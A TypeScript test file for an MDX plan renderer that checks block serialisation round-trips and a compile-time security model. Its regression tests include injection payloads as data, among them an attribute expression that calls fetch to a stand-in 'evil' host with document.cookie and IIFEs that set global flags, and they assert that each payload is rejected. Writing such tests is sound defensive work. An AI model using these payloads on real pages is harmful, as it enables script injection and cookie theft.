import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vite-plus/test";

// The in-repo review-blocks fixture, imported raw so the test drives the REAL
// render pipeline against the REAL file (Vite `?raw`).
import reviewFixtureSource from "../../../../../../plans/mdx-review-blocks/plan.mdx?raw";

import { FieldDiffRead } from "./blocks/fieldDiff";
import { compilePlanMdx } from "./MdxPlanRenderer";
import { PLAN_BLOCK_COMPONENTS, PLAN_BLOCKS, parsePlanBlock, serializePlanBlock } from "./registry";

/**
 * Verifies the MDX-plan vertical: (1) the byte-stable attr round-trip that is the
 * wire contract for authored plans, and (2) the 3-layer security model. This is
 * the high-risk surface (a wrong round-trip silently corrupts authored plans), so
 * it earns a test per AGENTS.md.
 */

const entryFor = (tag: string) => PLAN_BLOCKS.find((entry) => entry.tag === tag)!;
const codeEntry = entryFor("Code");
const dataModelEntry = entryFor("DataModel");
const roundTrip = (tag: string, data: unknown) =>
  parsePlanBlock(entryFor(tag), serializePlanBlock(entryFor(tag), data));

describe("mdx-plan block round-trip", () => {
  it("round-trips a Code block (multiline string attr)", () => {
    const data = {
      code: "export const x = 1\nconst y = 2\n",
      language: "ts",
      filename: "src/x.ts",
      maxLines: 12,
    };
    expect(parsePlanBlock(codeEntry, serializePlanBlock(codeEntry, data))).toEqual(data);
  });

  it("round-trips a DataModel block (JSON array props, diff fields inline)", () => {
    const data = {
      entities: [
        {
          id: "user",
          name: "User",
          fields: [
            { name: "id", type: "uuid", pk: true },
            { name: "org_id", type: "uuid", fk: "Org.id" },
          ],
        },
        { id: "org", name: "Org", change: "added" as const, fields: [{ name: "id", pk: true }] },
      ],
      relations: [{ from: "org", to: "user", kind: "1-n" as const, label: "members" }],
    };
    expect(parsePlanBlock(dataModelEntry, serializePlanBlock(dataModelEntry, data))).toEqual(data);
  });

  it("round-trips an Endpoint block (JSON array props; description is prose children, not an attr)", () => {
    const data = {
      method: "POST" as const,
      path: "/api/auth/token",
      summary: "Mint a token",
      params: [{ name: "userId", in: "body" as const, type: "string", required: true }],
      responses: [{ status: "201", description: "Created" }],
    };
    // description is serialized as prose children (dropped by the self-closing
    // serializer), so the attr round-trip covers everything else.
    expect(roundTrip("Endpoint", data)).toEqual({ ...data, method: "POST" });
  });

  it("round-trips a FileTree block", () => {
    const data = {
      title: "Changes",
      entries: [
        { path: "src/a.ts", change: "added" as const, note: "new" },
        { path: "src/b.ts", change: "modified" as const, snippet: "const x = 1\n", language: "ts" },
      ],
    };
    expect(roundTrip("FileTree", data)).toEqual(data);
  });

  it("round-trips an AnnotatedCode block (multiline code + line annotations)", () => {
    const data = {
      filename: "src/token.ts",
      language: "ts",
      code: "function mint() {\n  return sign(payload)\n}\n",
      annotations: [
        { lines: "2", label: "sign", note: "uses the KMS handle" },
        { lines: "1-3", note: "whole body" },
      ],
    };
    expect(roundTrip("AnnotatedCode", data)).toEqual(data);
  });

  it("round-trips a Diagram block (flat nodes/edges/caption attrs)", () => {
    const data = {
      caption: "Flow",
      nodes: [
        { id: "a", label: "A", x: 10, y: 20 },
        { id: "b", label: "B", detail: "detail", x: 80, y: 20 },
      ],
      edges: [{ from: "a", to: "b", label: "go" }],
    };
    expect(roundTrip("Diagram", data)).toEqual(data);
  });

  it("round-trips a QuestionForm block", () => {
    const data = {
      questions: [
        {
          id: "ttl",
          title: "Default TTL?",
          mode: "single" as const,
          options: [
            { id: "s", label: "1h", recommended: true },
            { id: "l", label: "30d", detail: "larger blast radius" },
          ],
        },
        { id: "free", title: "Anything else?", mode: "freeform" as const },
      ],
    };
    expect(roundTrip("QuestionForm", data)).toEqual(data);
  });

  it("round-trips a Checklist block", () => {
    const data = {
      items: [
        { id: "a", label: "Ship the renderer", checked: true },
        { id: "b", label: "Wire annotations", note: "across all blocks" },
      ],
    };
    expect(roundTrip("Checklist", data)).toEqual(data);
  });

  it("round-trips a Table block (columns + string rows)", () => {
    const data = {
      columns: ["Block", "Risk"],
      rows: [
        ["Diff", "self-contained LCS"],
        ["Mermaid", "lazy dep"],
      ],
      density: "compact" as const,
    };
    expect(roundTrip("Table", data)).toEqual(data);
  });

  it("round-trips a VisualQuestions block (same shape as QuestionForm)", () => {
    const data = {
      questions: [
        {
          id: "tier",
          title: "Which fidelity?",
          mode: "single" as const,
          options: [{ id: "w", label: "Wireframe", recommended: true }],
        },
      ],
    };
    expect(roundTrip("VisualQuestions", data)).toEqual(data);
  });

  it("round-trips a Diff block (multiline before/after + line annotations)", () => {
    const data = {
      filename: "src/add.ts",
      language: "ts",
      mode: "split" as const,
      before: "export function add(a, b) {\n  return a\n}\n",
      after: "export function add(a: number, b: number) {\n  return a + b\n}\n",
      annotations: [{ side: "after" as const, lines: "2", label: "fix", note: "actually sum" }],
    };
    expect(roundTrip("Diff", data)).toEqual(data);
  });

  it("round-trips an OpenApi block (spec kept as a verbatim string)", () => {
    const data = {
      title: "Tokens",
      spec: '{\n  "openapi": "3.0.0",\n  "info": { "title": "T", "version": "1" },\n  "paths": {}\n}',
    };
    expect(roundTrip("OpenApi", data)).toEqual(data);
  });

  it("round-trips a Mermaid block (multiline source attr)", () => {
    const data = {
      source: "flowchart TD\n  A[Start] --> B{Decision}\n  B --> C[Done]\n",
      caption: "Flow",
    };
    expect(roundTrip("Mermaid", data)).toEqual(data);
  });

  it("round-trips a Callout block (tone attr; body is prose children)", () => {
    const data = { tone: "risk" as const, body: "Untrusted HTML is a second trust boundary." };
    // body is serialized as prose children (dropped by the self-closing
    // serializer), so the attr round-trip covers `tone`; body decodes to "".
    expect(roundTrip("Callout", data)).toEqual({ tone: "risk", body: "" });
  });

  it("round-trips a Screen block (wireframe html + surface + caption)", () => {
    const data = {
      surface: "browser" as const,
      html: "<div style='padding:16px'><h1>Sign in</h1><button class='primary'>Go</button></div>",
      caption: "Sign-in screen",
    };
    expect(roundTrip("Screen", data)).toEqual(data);
  });

  it("round-trips a Json block (json kept as a verbatim string)", () => {
    const data = {
      title: "Payload",
      json: '{\n  "sub": "user_01",\n  "roles": ["member"]\n}',
      collapsedDepth: 2,
    };
    expect(roundTrip("Json", data)).toEqual(data);
  });

  it("round-trips a FieldDiff block (null present vs absent vs kept fields)", () => {
    const data = {
      title: "record.field",
      beforeLabel: "Current",
      afterLabel: "Proposed",
      fields: [
        { name: "necessity", before: "optional", after: "conditional" },
        { name: "condition", before: null, after: "a crisp gate" },
        { name: "introduced", after: "only after" },
        { name: "certainty", before: "definitive", after: "definitive", kept: true },
      ],
    };
    expect(roundTrip("FieldDiff", data)).toEqual(data);
  });

  it("round-trips a Details block (summary + open)", () => {
    expect(roundTrip("Details", { summary: "Full entry", open: true })).toEqual({
      summary: "Full entry",
      open: true,
    });
  });

  it("round-trips a Card block (heading + tone + badge + meta)", () => {
    const data = {
      heading: "A-1 · necessity",
      tone: "success" as const,
      badge: "NECESSITY_WRONG",
      meta: ["Pack A", "confidence: medium"],
    };
    expect(roundTrip("Card", data)).toEqual(data);
  });

  it("round-trips a ReviewChoice block", () => {
    const data = { itemId: "a1", label: "A-1", placeholder: "Why, if rejecting…" };
    expect(roundTrip("ReviewChoice", data)).toEqual(data);
  });

  it("emits <FieldDiff> in panel order so a single column stacks into two panels", () => {
    // The DOM order must be: Before label → all before values → After label →
    // all after values (the sm+ grid then column-flows this into aligned rows).
    // If it interleaves, grid-cols-1 below the breakpoint no longer stacks two
    // complete labelled panels (round-1 defect).
    const html = renderToStaticMarkup(
      createElement(FieldDiffRead, {
        data: {
          beforeLabel: "CURRENT_LABEL",
          afterLabel: "PROPOSED_LABEL",
          fields: [
            { name: "f1", before: "BVAL1", after: "AVAL1" },
            { name: "f2", before: "BVAL2", after: "AVAL2" },
          ],
        },
        blockId: undefined,
      }),
    );
    const order = ["CURRENT_LABEL", "BVAL1", "BVAL2", "PROPOSED_LABEL", "AVAL1", "AVAL2"];
    const positions = order.map((token) => html.indexOf(token));
    expect(positions.every((p) => p >= 0)).toBe(true);
    expect(positions).toEqual([...positions].sort((a, b) => a - b));
  });

  it("round-trips the authored wrap prop on Code / AnnotatedCode / Json / Diff", () => {
    expect(roundTrip("Code", { code: "x\n", wrap: true })).toEqual({ code: "x\n", wrap: true });
    expect(roundTrip("AnnotatedCode", { code: "x\n", annotations: [], wrap: true })).toEqual({
      code: "x\n",
      annotations: [],
      wrap: true,
    });
    expect(roundTrip("Json", { json: "{}", wrap: true })).toEqual({ json: "{}", wrap: true });
    expect(roundTrip("Diff", { before: "a\n", after: "b\n", wrap: true })).toEqual({
      before: "a\n",
      after: "b\n",
      wrap: true,
    });
  });
});

const GOOD = [
  "# Plan",
  "",
  "Some **bold** prose.",
  "",
  '<DataModel entities={[{ "id": "user", "name": "User", "fields": [{ "name": "id", "pk": true }] }]} />',
  "",
  '<Code language="ts" code={"export const mintToken = 1"} />',
  "",
].join("\n");

describe("mdx-plan security model", () => {
  it("renders good MDX with custom blocks + GFM through the registry", async () => {
    const Content = await compilePlanMdx(GOOD);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("User");
    expect(html).toContain('data-plan-block-type="data-model"');
    expect(html).toContain("mintToken"); // code body (SSR fallback <pre>)
  });

  it("renders the Phase 4 document blocks through the registry", async () => {
    const source = [
      '<Callout tone={"risk"}>\n\nUntrusted HTML is a second trust boundary.\n\n</Callout>',
      "",
      '<Checklist items={[{ "id": "a", "label": "Ship it", "checked": true }]} />',
      "",
      '<Table columns={["A", "B"]} rows={[["1", "2"]]} />',
      "",
      '<Diff filename="x.ts" before={"const a = 1\\n"} after={"const a = 2\\n"} />',
      "",
      '<VisualQuestions questions={[{ "id": "q", "title": "Which?", "mode": "single" }]} />',
      "",
      '<OpenApi spec={"{\\"openapi\\":\\"3.0.0\\",\\"info\\":{\\"title\\":\\"T\\",\\"version\\":\\"1\\"},\\"paths\\":{}}"} />',
    ].join("\n");
    const Content = await compilePlanMdx(source);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).toContain('data-plan-block-type="callout"');
    expect(html).toContain('data-plan-block-type="checklist"');
    expect(html).toContain('data-plan-block-type="table"');
    expect(html).toContain('data-plan-block-type="diff"');
    expect(html).toContain('data-plan-block-type="visual-questions"');
    expect(html).toContain('data-plan-block-type="openapi-spec"');
  });

  it("renders the review blocks (Card/FieldDiff/Details/ReviewChoice) through the registry", async () => {
    const source = [
      '<Card heading="A-1" tone="success" badge="OK" meta={["Pack A"]}>',
      "",
      "Body prose for the item.",
      "",
      '<FieldDiff title="r" fields={[{ "name": "n", "before": null, "after": "x" }]} />',
      "",
      '<Details summary="More">',
      "",
      "Hidden evidence.",
      "",
      "</Details>",
      "",
      '<ReviewChoice itemId="a1" label="A-1" />',
      "",
      "</Card>",
    ].join("\n");
    const Content = await compilePlanMdx(source);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).toContain('data-plan-block-type="card"');
    expect(html).toContain('data-plan-block-type="field-diff"');
    expect(html).toContain('data-plan-block-type="details"');
    expect(html).toContain('data-plan-block-type="review-choice"');
    // present-null renders italic null; the after value renders verbatim.
    expect(html).toContain("null");
    expect(html).toContain("A-1");
  });

  it("compiles the in-repo review-blocks fixture end-to-end", async () => {
    const Content = await compilePlanMdx(reviewFixtureSource); // throws on unknown tag / guard reject
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    for (const type of ["card", "field-diff", "details", "review-choice", "json-explorer"]) {
      expect(html).toContain(`data-plan-block-type="${type}"`);
    }
  });

  it("rejects imports/exports at compile", async () => {
    await expect(compilePlanMdx('import fs from "node:fs"\n\n# hi')).rejects.toThrow();
  });

  it("rejects raw {expression} bodies at compile", async () => {
    await expect(compilePlanMdx("# hi\n\nvalue: {globalThis.location}")).rejects.toThrow();
  });

  // B1 regression: attribute-value expressions compile to executable JS and are
  // NOT reached by the body-node walk. Each of these must be rejected at compile,
  // or a `.mdx` opened in the preview panel runs arbitrary browser JS.
  it.each([
    ["sequence expression", '<Code language="ts" code={((globalThis.__pwned = true), "x")} />'],
    [
      "IIFE",
      '<Code language="ts" code={(function(){ globalThis.__pwned2 = true; return "y" })()} />',
    ],
    ["fetch call", "<Code language=\"ts\" code={fetch('https://evil/' + document.cookie)} />"],
    ["member access", '<Code language="ts" code={window.location.href} />'],
    ["arrow function", '<Code language="ts" code={(() => globalThis.x)()} />'],
  ])("rejects non-literal attribute expression: %s", async (_label, source) => {
    await expect(compilePlanMdx(source)).rejects.toThrow();
  });

  it("still compiles legitimate JSON-literal attribute expressions on real blocks", async () => {
    const source = [
      '<DataModel entities={[{ "id": "user", "name": "User", "fields": [{ "name": "id", "pk": true }] }]} />',
      "",
      '<Diagram nodes={[{ "id": "a", "label": "A" }]} edges={[]} />',
      "",
      '<Code language="ts" code={"export const x = 1"} maxLines={12} />',
      "",
      "<QuestionForm questions={[]} />",
    ].join("\n");
    const Content = await compilePlanMdx(source);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).toContain('data-plan-block-type="data-model"');
    expect(html).toContain('data-plan-block-type="diagram"');
    expect(html).toContain("export const x = 1");
  });

  it("renders unknown components as an inline error card, keeping the rest of the doc", async () => {
    const Content = await compilePlanMdx(
      "# Title\n\n<Malicious onClick={1}>secret</Malicious>\n\nAfter.",
    );
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    // The unknown tag degrades to the error card (attrs/children dropped)…
    expect(html).toContain("Malicious");
    expect(html).toContain("Unknown block");
    expect(html).not.toContain("secret");
    expect(html).not.toContain("onClick");
    // …while the surrounding document still renders.
    expect(html).toContain("Title");
    expect(html).toContain("After.");
  });

  // S1 regression: an un-id'd block must NOT emit `data-plan-block-id=""` — the
  // empty attr defeats the `assignBlockIds` fallback and collides every un-id'd
  // block onto the first `[data-plan-block-id=""]` match.
  it("omits data-plan-block-id when the author gives no id", async () => {
    const source = [
      '<Code language="ts" code={"const a = 1"} />',
      "",
      '<Code language="ts" code={"const b = 2"} />',
    ].join("\n");
    const Content = await compilePlanMdx(source);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).not.toContain('data-plan-block-id=""');
  });
});
